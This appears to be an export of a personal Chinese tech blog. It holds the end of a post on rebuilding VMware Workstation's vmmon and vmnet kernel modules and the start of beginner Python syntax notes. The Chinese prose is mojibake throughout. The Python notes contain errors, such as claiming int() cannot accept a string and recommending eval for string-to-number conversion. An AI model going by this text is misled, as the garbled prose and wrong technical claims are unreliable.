class="line">2022-04-28T02:28:35.686Z In(05) host-19294 Unable to install all modules.  See log for details.</span><br><span class="line">2022-04-28T02:28:35.686Z In(05) host-19294 </span><br></pre></td></tr></table></figure>

<p>ä¸€éƒ¨åˆ†çš„æŠ¥é”™æ—¥å¿—</p>
<p>ç„¶åå‘ç°ç¼–è¯‘çš„æ—¶å€™ç¼ºå°‘<code>stdarg.h</code>çš„ä¾èµ–åº“ï¼Œå¯»æ€ç€æ˜¯æ²¡æ‰¾åˆ°è¿™ä¸ªä¾èµ–åº“ï¼Œç„¶ågoogleä¸€æ³¢</p>
<h1 id="è§£å†³æ–¹æ¡ˆ1"><a href="#è§£å†³æ–¹æ¡ˆ1" class="headerlink" title="è§£å†³æ–¹æ¡ˆ1"></a>è§£å†³æ–¹æ¡ˆ1</h1><p>æˆ‘ç”¨è¿™ä¸ªæ²¡æˆåŠŸ</p>
<p>æœ‰ä¸€ä¸ªç”¨vmware-modconfigå·¥å…·æ¥å°è¯•è§£å†³çš„</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/20220428111414.png"></p>
<p><code>find /usr -name &quot;stdarg.h&quot;</code></p>
<p>ç„¶åæŠŠåˆ—å‡ºæ¥çš„stdarg.hçš„è·¯å¾„å¡«å…¥ä¸‹é¢çš„CPATHå°è¯•</p>
<p><code>sudo CPATH=[stdarg.hæ‰€åœ¨çš„path] vmware-modconfig --console --install-all</code></p>
<p>ä½†æ˜¯æˆ‘è¿™é‡Œå¤±è´¥äº†ï¼Œå¯èƒ½æœ‰æˆåŠŸçš„æƒ…å†µ</p>
<h1 id="è§£å†³æ–¹æ¡ˆ2"><a href="#è§£å†³æ–¹æ¡ˆ2" class="headerlink" title="è§£å†³æ–¹æ¡ˆ2"></a>è§£å†³æ–¹æ¡ˆ2</h1><p>æœ€ååœ¨vmwareè®ºå›çš„ä¸€ä¸ªå›å¤é‡Œæ‰¾åˆ°äº†[è§£å†³æ–¹æ¡ˆ][<a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211]">https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211]</a></p>
<p>ç®€å•ç¿»è¯‘ä¸€äº›ï¼Œä»–æ­¥éª¤å†™éå¸¸è¯¦ç»†:</p>
<ol>
<li><p>å¯¼èˆªåˆ°<code>/usr/lib/vmware/modules/source/</code></p>
</li>
<li><p>åˆ†åˆ«é€šè¿‡sudo tar xvfå‘½ä»¤è§£å‹<code>vmmon.tar</code> <code>vmnet.tar</code></p>
</li>
<li><p>ç¼–è¾‘ <code>vmmon-only/include/vm_asm_x86.h</code></p>
<p>æ³¨é‡Š65,66,67,68,69,70 å’Œ 72 è¡Œ</p>
<p>ä¹Ÿå°±æ˜¯è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65 //#ifndef USE_UBSAN</span><br><span class="line">66 //#define ASSERT_ON_COMPILE_SELECTOR_SIZE(expr) \</span><br><span class="line">67 // ASSERT_ON_COMPILE(sizeof(Selector) == 2 &amp;&amp; \</span><br><span class="line">68 // ((__builtin_constant_p(expr) &amp;&amp; ((expr) &gt;&gt; 16) == 0) || \</span><br><span class="line">69 // sizeof(expr) &lt;= 2))</span><br><span class="line">70 //#else</span><br><span class="line">71 #define ASSERT_ON_COMPILE_SELECTOR_SIZE(expr)     &lt;&lt;&lt;---- DO NOT COMMENT OUT this line</span><br><span class="line">72 //#endif</span><br></pre></td></tr></table></figure></li>
<li><p><code>cd..</code>é€€åˆ°<code>/usr/lib/vmware/modules/source/vmmon-only</code>ç›®å½•è¿è¡Œsudo make</p>
<p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœç¼–è¯‘å¤±è´¥çš„è¯å¯ä»¥ç”¨ï¼ˆæˆ‘ç›´æ¥makeè¿˜æ˜¯å¤±è´¥äº†ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šCPATHç¯å¢ƒå˜é‡ï¼‰</p>
<p><code>sudo CPATH=[stdarg.hæ‰€åœ¨çš„path] make</code>æ¥è§£å†³ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢é‚£ä¸ªè§£å†³æ–¹æ¡ˆçš„æ–¹å¼ï¼ˆè¿™é‡Œå…¶å®æ˜¯å‚è€ƒäº†ä¸Šä¸€ç§è§£å†³æ–¹æ¡ˆï¼‰</p>
<p>æˆ‘è¿™é‡Œå°±æŒ‡å®šäº†ä¸€ä¸‹CPATHç„¶åç¼–è¯‘æˆåŠŸäº†ï¼Œåªè¦ä¸errorå°±è¡Œwarningå¿½ç•¥å°±è¡Œ</p>
</li>
<li><p>ç„¶åcdåˆ°<code>vmnet-only</code>ç›®å½•ä¸‹ï¼Œç»§ç»­ç¼–è¯‘<code>sudo CPATH=[stdarg.hæ‰€åœ¨çš„path] make</code></p>
</li>
<li><p>ç„¶åè¿”å›<code>/usr/lib/vmware/modules/source</code>ç›®å½•</p>
<p>æ‰§è¡Œå››æ¡å‘½ä»¤</p>
<p><code>sudo cp vmmon.o /lib/modules/</code>uname -r<code>/kernel/drivers/misc/vmmon.ko</code></p>
<p><code>sudo cp vmnet.o /lib/modules/</code>uname -r<code>/kernel/drivers/misc/vmnet.ko</code></p>
<p><code>sudo depmod -a</code></p>
<p><code>sudo systemctl restart vmware.service</code></p>
</li>
<li><p>ç„¶åå†ä»å›¾æ ‡ç‚¹å¼€vmwareå°±å¯ä»¥äº†</p>
</li>
</ol>
<p>è®©æˆ‘ä»¬è°¢è°¢è¿™ä¸ªè€å“¥</p>
<p>thx :) <a href="https://communities.vmware.com/t5/user/viewprofilepage/user-id/5452131">sabennett</a>     </p>
<p>å¯¹äº†</p>
<p>æœ€ååˆ«å¿˜äº†å…³æ›´æ–°</p>
<p><img src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/20220428113754.png">                                      </p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul>
<li><p><a href="https://redtm.com/blog/vmware-workstation-on-kernel-5.16.0-1debian-testing/">https://redtm.com/blog/vmware-workstation-on-kernel-5.16.0-1debian-testing/</a></p>
</li>
<li><p><a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211">https://communities.vmware.com/t5/VMware-Workstation-Pro/VM-Workstation-16-1-gt-16-2-1-on-Ubuntu-21-10-broke-everything/m-p/2885277/highlight/true#M173211</a></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonè¯­æ³•ç¬”è®°</title>
    <url>/2021/11/06/python/</url>
    <content><![CDATA[<h1 id="pythonè¯­æ³•ç¬”è®°"><a href="#pythonè¯­æ³•ç¬”è®°" class="headerlink" title="pythonè¯­æ³•ç¬”è®°"></a>pythonè¯­æ³•ç¬”è®°</h1><span id="more"></span>

<hr>
<ul>
<li>æ–‡æ¡£ä¸­<code>outsï¼š</code>ä¸ºç»ˆç«¯è¾“å‡ºçš„å†…å®¹</li>
</ul>
<h2 id="pyåŸºæœ¬å…ƒç´ ï¼ˆå˜é‡ï¼Œæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼‰"><a href="#pyåŸºæœ¬å…ƒç´ ï¼ˆå˜é‡ï¼Œæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼‰" class="headerlink" title="pyåŸºæœ¬å…ƒç´ ï¼ˆå˜é‡ï¼Œæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼‰"></a>pyåŸºæœ¬å…ƒç´ ï¼ˆå˜é‡ï¼Œæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼‰</h2><p>pythonçš„å†…å»ºæ•°æ®ç±»å‹åŒ…æ‹¬å¸ƒå°”ï¼Œæ•´å½¢ï¼Œæµ®ç‚¹åŠå­—ç¬¦ä¸²</p>
<h3 id="å˜é‡ï¼ˆvariableï¼‰"><a href="#å˜é‡ï¼ˆvariableï¼‰" class="headerlink" title="å˜é‡ï¼ˆvariableï¼‰"></a>å˜é‡ï¼ˆvariableï¼‰</h3><p>pyçš„å˜é‡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªcè¯­è¨€çš„ç»“æ„ä½“ï¼ˆstructï¼‰ï¼Œå°±åƒåœ¨ä¸€ä¸ªç›’å­ä¸­é¢„å…ˆåˆ†é…å¥½äº†å¸ƒå°”ç±»å‹çš„ç©ºé—´ï¼Œæ•´å½¢çš„ç©ºé—´ï¼Œæµ®ç‚¹çš„ç©ºé—´ï¼Œå­—ç¬¦ä¸²çš„ç©ºé—´ã€‚å› æ­¤pyçš„å˜é‡æœ¬èº«å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆobjectï¼‰çš„å®ç°ï¼Œ<strong>æ‰€ä»¥ä½¿ç”¨æ—¶ä¸éœ€è¦å®ç°å®šä¹‰å˜é‡ç±»å‹</strong> </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å› ä¸ºä»¥ä¸Šç‰¹æ€§ï¼Œä»¥ä¸‹çš„æ“ä½œæ—¶åˆæ³•çš„</span></span><br><span class="line">a = <span class="number">7</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = <span class="string">&quot;abc&quot;</span>  <span class="comment">#å€¼å¾—æ³¨æ„çš„æ—¶pyä¸­è¡¨ç¤ºå­—ç¬¦ä¸²æ—¢å¯ä»¥ç”¨â€˜ä¹Ÿå¯ä»¥â€œ</span></span><br><span class="line"><span class="built_in">print</span>(a)   </span><br><span class="line">a = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#out: 7</span></span><br><span class="line"><span class="comment">#out: abc</span></span><br><span class="line"><span class="comment">#out: abc</span></span><br></pre></td></tr></table></figure>

<p>å…³äºå˜é‡åï¼ŒåŒæ ·ç”±å¤§ã€å°å†™å­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼Œæ•°ç»„ç»„æˆï¼Œä¸”æ•°å­—ä¸èƒ½åœ¨å˜é‡åä¸­ä½œä¸ºé¦–ä¸ªå­—ç¬¦ã€‚å¦å¤–ï¼Œpyçš„ä¿ç•™å­—ç¬¦ä¹Ÿä¸å¯ä½œä¸ºå˜é‡åå‡ºç°ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p>![reserved keyword](C:\Users\83487\Pictures\programmer path\reserved keyword.jpg)</p>
<p>str-byte</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytes</span>(string,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>byte-str</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="å­—ç¬¦ä¸²ï¼ˆstringï¼‰"><a href="#å­—ç¬¦ä¸²ï¼ˆstringï¼‰" class="headerlink" title="å­—ç¬¦ä¸²ï¼ˆstringï¼‰"></a>å­—ç¬¦ä¸²ï¼ˆstringï¼‰</h3><ul>
<li>ç”¨æ–¹æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œï¼ˆusageï¼š<code>å˜é‡å.æ–¹æ³•åï¼ˆï¼‰</code>ï¼‰</li>
</ul>
<ol>
<li><p><strong>è·å–é•¿åº¦</strong>å¯ä»¥ä½¿ç”¨<code>len()</code></p>
</li>
<li><p><strong>æå–å­—ç¬¦ä¸²</strong>ä½¿ç”¨<code>[]</code>(è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæ–¹æ³•)(å…è®¸è´Ÿå€¼)</p>
</li>
<li><p><strong>æ‹¼æ¥</strong> å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥ç”¨<code>+</code></p>
</li>
<li><p><strong>å¤åˆ¶</strong>å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨<code>*</code></p>
</li>
<li><p><strong>åˆ†ç‰‡</strong> ï¼ˆsilceï¼‰usageï¼š<code>[start:stop:step]</code>  3sæ³•(</p>
</li>
<li><p><strong>åˆ é™¤</strong> å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºç™½å¯ä»¥ç”¨æ–¹æ³•<code>rstrip()</code></p>
<p>  åˆ å¼€å¤´çš„ç©ºç™½<code>lstrip()</code></p>
<p>  åˆ ä¸¤å¤´çš„ç©ºç™½<code>strip()</code></p>
</li>
<li><p><strong>è½¬ä¹‰</strong> ä½¿ç”¨åæ–œæ   \ ï¼Œå¯ä»¥ç”¨<code>\t</code>æˆ–è€…<code>\n</code>   </p>
</li>
<li><p><strong>åˆ†å‰²</strong> å­—ç¬¦ä¸²<code>spilt()</code>ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼ˆä¹‹åä¼šä»‹ç»ï¼‰</p>
</li>
<li><p><strong>åˆå¹¶</strong>å­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨<code>join()</code>,æœ¬è´¨æ˜¯å°†åˆ—è¡¨è¿˜åŸæˆå­—ç¬¦ä¸²</p>
</li>
<li><p><strong>å­—ç¬¦ä¸²ä¸­å•è¯é¦–å­—æ¯å¤§å†™</strong> ä½¿ç”¨<code>title()</code>ï¼ŒåŒæ ·çš„ï¼Œ<code>.upper()</code>&amp;<code>.lower()</code>æ˜¯å˜æˆæ•´ä¸ªå­—ç¬¦ä¸²å¤§å†™å’Œå°å†™</p>
</li>
<li><p><strong>å­—ç¬¦ä¸²è½¬æ•°å­—</strong> ä½¿ç”¨evalå‡½æ•°ï¼Œåªæ¥æ”¶å­—ç¬¦ä¸²ï¼Œå¦‚æœè¾“å…¥123pyä¼šè§£é‡Šæ˜¯ä¸€ä¸ª123çš„æ•°å­—</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²ä¾‹å­</span></span><br><span class="line">id_info = <span class="string">&quot;my name is Atuoa&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(id_info)) <span class="comment">#len</span></span><br><span class="line"><span class="comment">#outsï¼š16</span></span><br><span class="line"></span><br><span class="line">new_idinfo = id_info.replace(<span class="string">&#x27;Atuoa&#x27;</span>,<span class="string">&quot;harry&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_idinfo)  <span class="comment">#replaceï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span></span><br><span class="line"><span class="comment">#outsï¼šmy name is harry</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(id_info[<span class="number">11</span>:<span class="number">16</span>]) <span class="comment">#slice</span></span><br><span class="line"><span class="comment">#outsï¼šAtuoa    #è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸‹æ ‡ä¸º0ï¼Œå®é™…å–å€¼èŒƒå›´[11,16)</span></span><br><span class="line">				<span class="comment">#å¦‚æœid_info[0]åˆ™æ˜¯&#x27;m&#x27;å•ä¸ªå­—ç¬¦</span></span><br><span class="line">    			<span class="comment">#å¦‚æœæ˜¯id_info[-1]åˆ™æ˜¯&#x27;a&#x27;å•ä¸ªå­—ç¬¦</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(id_info * <span class="number">3</span> )<span class="comment">#copy</span></span><br><span class="line"><span class="comment">#outsï¼šmy name is Atuoamy name is Atuoamy name is Atuoa</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(id_info.split())<span class="comment">#é»˜è®¤æŒ‰ç…§ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦åˆ†è£‚</span></span><br><span class="line"><span class="built_in">print</span>(id_info.split(<span class="string">&#x27;i&#x27;</span>)) <span class="comment">#å«å‚æ•°å³åŸºäºå‚æ•°åˆ†è£‚å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#outsï¼š [&#x27;my&#x27;, &#x27;name&#x27;, &#x27;is&#x27;, &#x27;Atuoa&#x27;]</span></span><br><span class="line"><span class="comment">#outsï¼š[&#x27;my name &#x27;, &#x27;s Atuoa&#x27;]   #liståˆ—è¡¨å½¢å¼ï¼Œè¿™é‡Œæš‚ä¸”ä¸è®¨è®º</span></span><br><span class="line"></span><br><span class="line">add_info = <span class="string">&quot;,whats your name?&quot;</span></span><br><span class="line">greet_you = id_info + <span class="string">&#x27;\t&#x27;</span> +add_info  <span class="comment">#è½¬ä¹‰ä¸+</span></span><br><span class="line"><span class="built_in">print</span>(greet_you)</span><br><span class="line"><span class="comment">#outsï¼šmy name is Atuoa        ,whats your name?</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27; &#x27;</span>.join(add_info.split()) <span class="comment">#join</span></span><br><span class="line"><span class="built_in">print</span>(id_info,tmp)</span><br><span class="line"><span class="comment">#outsï¼šmy name is Atuoa ,whats your name?</span></span><br><span class="line"><span class="comment">#joinçš„è°ƒç”¨å…¶å®æœ‰ç‚¹å˜æ‰­ç”¨çš„ä¹Ÿæ¯”è¾ƒå°‘ï¼Œusageï¼šstring.join(),æ‹¬å·ä¸­å‚æ•° æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œè¿™é‡Œæš‚ä¸”ä¸è®¨è®ºï¼Œåé¢æœ‰è¯¦ç»†æåŠ</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>å­—ç¬¦ä¸²å‰ç¼€</p>
<ol>
<li>   å­—ç¬¦ä¸²å‰åŠ  uæˆ–è€…ä¸åŠ   </li>
</ol>
<blockquote>
<p>   ä¸¾ä¾‹ï¼šuâ€å­—ç¬¦ä¸²ä¸­æœ‰ä¸­æ–‡â€<br>   å«ä¹‰<br>   1ã€å‰ç¼€uè¡¨ç¤ºè¯¥å­—ç¬¦ä¸²æ˜¯unicodeç¼–ç <br>   2ã€Python2ä¸­ç”¨ï¼Œç”¨åœ¨å«æœ‰ä¸­æ–‡å­—ç¬¦çš„å­—ç¬¦ä¸²å‰ï¼Œé˜²æ­¢å› ä¸ºç¼–ç é—®é¢˜ï¼Œå¯¼è‡´ä¸­æ–‡å‡ºç°ä¹±ç ã€‚<br>   3ã€ä¸€èˆ¬è¦åœ¨æ–‡ä»¶å¼€å…³æ ‡æ˜ç¼–ç æ–¹å¼é‡‡ç”¨utf8ã€‚<br>   4ã€Python3ä¸­ï¼Œæ‰€æœ‰å­—ç¬¦ä¸²é»˜è®¤éƒ½æ˜¯unicodeå­—ç¬¦ä¸²ã€‚  </p>
</blockquote>
<ol start="2">
<li>å­—ç¬¦ä¸²å‰åŠ  r  </li>
</ol>
<blockquote>
<p>   ä¸¾ä¾‹ï¼šrâ€adc\n\r\tdkfjkdâ€<br>   å«ä¹‰<br>   1ã€å‰ç¼€rè¡¨ç¤ºè¯¥å­—ç¬¦ä¸²æ˜¯åŸå§‹å­—ç¬¦ä¸²ï¼Œå³\ä¸æ˜¯è½¬ä¹‰ç¬¦ï¼Œåªæ˜¯å•çº¯çš„ä¸€ä¸ªç¬¦å·ã€‚<br>   2ã€å¸¸ç”¨äºç‰¹æ®Šçš„å­—ç¬¦å¦‚æ¢è¡Œç¬¦ã€æ­£åˆ™è¡¨è¾¾å¼ã€æ–‡ä»¶è·¯å¾„ã€‚<br>   3ã€æ³¨æ„ä¸èƒ½åœ¨åŸå§‹å­—ç¬¦ä¸²ç»“å°¾è¾“å…¥åæ–œçº¿ï¼Œå¦åˆ™Pythonä¸çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯æ¢è¡Œç¬¦(å­—ç¬¦ä¸²æœ€åç”¨\è¡¨ç¤ºæ¢è¡Œ)  </p>
</blockquote>
<ol start="3">
<li>å­—ç¬¦ä¸²å‰åŠ  b  </li>
</ol>
<blockquote>
<p>   å«ä¹‰<br>   1ã€å‰ç¼€bè¡¨ç¤ºè¯¥å­—ç¬¦ä¸²æ˜¯bytesç±»å‹ã€‚<br>   2ã€ç”¨åœ¨Python3ä¸­ï¼ŒPython3é‡Œé»˜è®¤çš„stræ˜¯unicodeç±»ã€‚Python2çš„stræœ¬èº«å°±æ˜¯bytesç±»ï¼Œæ‰€ä»¥å¯ä¸ç”¨ã€‚<br>   3ã€å¸¸ç”¨åœ¨å¦‚ç½‘ç»œç¼–ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å’Œæµè§ˆå™¨åªè®¤bytesç±»å‹æ•°æ®ã€‚å¦‚ï¼šsend å‡½æ•°çš„å‚æ•°å’Œ recv å‡½æ•°çš„è¿”å›å€¼éƒ½æ˜¯ bytes ç±»å‹ã€‚<br>   4ã€åœ¨ Python3 ä¸­ï¼Œbytes å’Œ str çš„äº’ç›¸è½¬æ¢æ–¹å¼æ˜¯<br>   str.encode(â€˜utf-8â€™)<br>   bytes.decode(â€˜utf-8â€™)  </p>
</blockquote>
<ol start="4">
<li>å­—ç¬¦ä¸²å‰åŠ  f  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testFStr</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line">    age = <span class="number">25</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;my name is <span class="subst">&#123;name&#125;</span>, i am <span class="subst">&#123;age&#125;</span> years old&#x27;</span>)</span><br><span class="line"></span><br><span class="line">testFStr()</span><br></pre></td></tr></table></figure>

<p>  å«ä¹‰ </p>
<blockquote>
<p>   1ã€Python3.6æ–°åŠ ç‰¹æ€§ï¼Œå‰ç¼€fç”¨æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯ä»¥çœ‹å‡ºfå‰ç¼€å¯ä»¥æ›´æ–¹ä¾¿çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²,æ¯”format()æ–¹æ³•å¯è¯»æ€§é«˜ä¸”ä½¿ç”¨æ–¹ä¾¿ã€‚<br>   2ã€è€Œä¸”åŠ ä¸Šfå‰ç¼€å,æ”¯æŒåœ¨å¤§æ‹¬å·å†…,è¿è¡ŒPythonè¡¨è¾¾å¼ã€‚<br>   3ã€è¿˜å¯ä»¥ç”¨frå‰ç¼€æ¥è¡¨ç¤ºåŸç”Ÿå­—ç¬¦ä¸²ã€‚    </p>
</blockquote>
</li>
</ul>
<p>æ›´å¤šï¼š</p>
<p><a href="https://docs.python.org/3/library/stdtypes.html#string-methods">stringå®˜æ–¹æ–‡æ¡£</a></p>
<h3 id="æ•°å­—ï¼ˆnumberï¼‰"><a href="#æ•°å­—ï¼ˆnumberï¼‰" class="headerlink" title="æ•°å­—ï¼ˆnumberï¼‰"></a>æ•°å­—ï¼ˆnumberï¼‰</h3><table>
<thead>
<tr>
<th>è¿ç®—ç¬¦å·</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>åŠ æ³•</td>
</tr>
<tr>
<td>-</td>
<td>å‡æ³•</td>
</tr>
<tr>
<td>*</td>
<td>ä¹˜æ³•</td>
</tr>
<tr>
<td>/</td>
<td>é™¤æ³•</td>
</tr>
<tr>
<td>//</td>
<td>æ•´é™¤ï¼ˆä¹Ÿå«åœ°æ¿é™¤æ³•floor divisionï¼‰</td>
</tr>
<tr>
<td>%</td>
<td>æ±‚æ¨¡ï¼ˆå–ä½™ï¼‰</td>
</tr>
<tr>
<td>**</td>
<td>ä¹˜å¹‚</td>
</tr>
</tbody></table>
<p>ç®€å•çš„ä»‹ç»ä¸‰ä¸ªæ•°å­—å‡½æ•°ï¼š</p>
<p><code>divmod()</code>æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå…ƒç»„ï¼ˆtupleï¼‰ç¬¬ä¸€ä¸ªå€¼ä¸ºå•†ï¼Œç¬¬äºŒå€¼ä¸ºä½™æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">divmod</span>(<span class="number">9</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p><code>int()</code> ,æ‹¬å·å†…å¯ä»¥æ¥å—æ•´å½¢æˆ–æµ®ç‚¹å‹å˜é‡ï¼Œä½†ä¸èƒ½æ˜¯å­—ç¬¦ä¸²</p>
<p><code>str()</code>å‡½æ•°å¯ä»¥å°†æ•°å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greet = <span class="string">&quot;hello&quot;</span></span><br><span class="line">name = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(greet,<span class="built_in">str</span>(name))</span><br><span class="line"><span class="comment">#outs:hello 123 #printä¸­</span></span><br></pre></td></tr></table></figure>

<p>py2ä¸­   æ•´æ•°/æ•´æ•°ä¾æ—§æ˜¯å‘ä¸‹å–æ•´ ï¼Œç±»ä¼¼äºc++</p>
<p>py3ä¸­ ä¼šæ˜¾ç¤ºæ­£å¸¸è®¡ç®—çš„ç»“æœ</p>
<p>æ›´å¤šï¼š</p>
<p><a href="https://docs.python.org/3/library/math.html">mathå®˜æ–¹æ–‡æ¡£</a></p>
<p>pythonå†…å»ºçš„æ•°å­¦å‡½æ•°æ‰§è¡Œæ•ˆç‡è¾ƒä½ï¼Œå ç”¨å†…å­˜è¾ƒå¤§ï¼Œæ‰€ä»¥ä»‹ç»çš„ç›¸å¯¹è¾ƒå°‘ï¼Œä¸€èˆ¬pyç”¨äºå¤§æ•°æ®å¤„ç†æ—¶ä¼šç”¨ç¬¬ä¸‰æ–¹çš„åº“numpyã€‚</p>
<h3 id="æ³¨é‡Š-ï¼ˆannotationï¼‰"><a href="#æ³¨é‡Š-ï¼ˆannotationï¼‰" class="headerlink" title="æ³¨é‡Š ï¼ˆannotationï¼‰"></a>æ³¨é‡Š ï¼ˆannotationï¼‰</h3><ul>
<li>é‡‡ç”¨<code>#</code>å‘èµ·çš„å•è¡Œæ³¨é‡Š</li>
<li>é‡‡ç”¨<code>&#39;&#39;&#39;</code>æˆ–è€…<code>&quot;&quot;&quot;</code>å¼•èµ·çš„å¤šè¡Œæ³¨é‡Š</li>
</ul>
<h3 id="åˆ©ç”¨-è¿æ¥ä¸¤è¡Œå­—ç¬¦"><a href="#åˆ©ç”¨-è¿æ¥ä¸¤è¡Œå­—ç¬¦" class="headerlink" title="åˆ©ç”¨ \è¿æ¥ä¸¤è¡Œå­—ç¬¦"></a>åˆ©ç”¨ \è¿æ¥ä¸¤è¡Œå­—ç¬¦</h3><p>å¯ä»¥ä½¿ç”¨åæ–œæ (\)æ¥è¿æ¥ä¸¤è¡Œå†…å®¹ï¼Œå°†å…¶æ”¾åœ¨ç¬¬ä¸€è¡Œçš„æœ«å°¾ï¼Œpyå°†ç¬¬äºŒè¡Œå’Œç¬¬ä¸€è¡Œè§£é‡Šä¸º1è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example = <span class="string">&#x27;abc&#x27;</span> + \</span><br><span class="line">			<span class="string">&#x27;defg&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="comment">#out : abcdefg</span></span><br></pre></td></tr></table></figure>

<h2 id="pyå®¹å™¨ï¼ˆåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼Œé›†åˆï¼‰"><a href="#pyå®¹å™¨ï¼ˆåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼Œé›†åˆï¼‰" class="headerlink" title="pyå®¹å™¨ï¼ˆåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼Œé›†åˆï¼‰"></a>pyå®¹å™¨ï¼ˆåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼Œé›†åˆï¼‰</h2><h3 id="åˆ—è¡¨ï¼ˆlistï¼‰"><a href="#åˆ—è¡¨ï¼ˆlistï¼‰" class="headerlink" title="åˆ—è¡¨ï¼ˆlistï¼‰"></a>åˆ—è¡¨ï¼ˆlistï¼‰</h3><p>åˆ—è¡¨å¯ä»¥è¿‘ä¼¼çš„ç†è§£æˆä¸€ä¸ªæ•°ç»„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåˆ—è¡¨çš„ä¾‹å­</p>
<ol>
<li><p>æŒ‡å®šå…ƒç´ åˆ›å»ºåˆ—è¡¨</p>
<p>usageï¼š<code>åˆ—è¡¨å = [&#39;å…ƒç´ 1&#39;,&#39;å…ƒç´ 2&#39;,&#39;å…ƒç´ 3&#39;,&#39;å…ƒç´ 4&#39;]</code> ï¼ˆå•å¼•å·+æ–¹æ‹¬å¼§ï¼‰</p>
<p>è¾“å‡º<code>print(åˆ—è¡¨å[0])</code> å³ä¸º â€œå…ƒç´ 1â€</p>
